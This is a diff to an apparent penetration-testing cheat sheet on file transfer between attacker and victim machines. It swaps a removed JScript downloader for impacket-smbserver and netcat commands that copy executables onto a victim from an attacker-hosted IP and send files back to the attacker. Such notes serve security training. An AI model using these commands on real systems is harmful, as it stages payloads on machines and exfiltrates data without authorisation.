@@ -14,14 +14,6 @@ Python2
 > sudo python -m SimpleHTTPServer 80
 ```
 
-###### netcat
-```
-On the attacker system:
-> nc -lvp 80 > file.txt
-On the target system:
-> nc 192.168.1.1 80 < file.txt
-```
-
 ###### wget
 ```
 > wget.exe http://192.168.1.1:80/file.txt
@@ -52,17 +44,22 @@ http://192.168.1.1/file.exe')
 http://192.168.1.1/file.exe')
 ```
 
-###### VBScript
+###### impacket-smbserver
 ```
-echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
-echo WinHttpReq.Send();
-echo BinStream = new ActiveXObject("ADODB.Stream");
-echo BinStream.Type = 1;
-echo BinStream.Open();
-echo BinStream.Write(WinHttpReq.ResponseBody);
-echo BinStream.SaveToFile("out.exe");
+On attacker machine:
+> impacket-smbserver transfer ./
 
-Run with:
-> cscript /nologo <name>.js http://192.168.1.1/file
+On victim machine:
+> dir \\192.168.1.1\transfer
+> copy \\192.168.1.1\transfer\file.exe ./
+```
+
+###### netcat
+```
+On the target system:
+> nc -lvp 80 > file.txt
+On the attacker system:
+> nc 192.168.1.1 80 < file.txt
+
+Also works the other way, to get files back to the attacker system
 ```
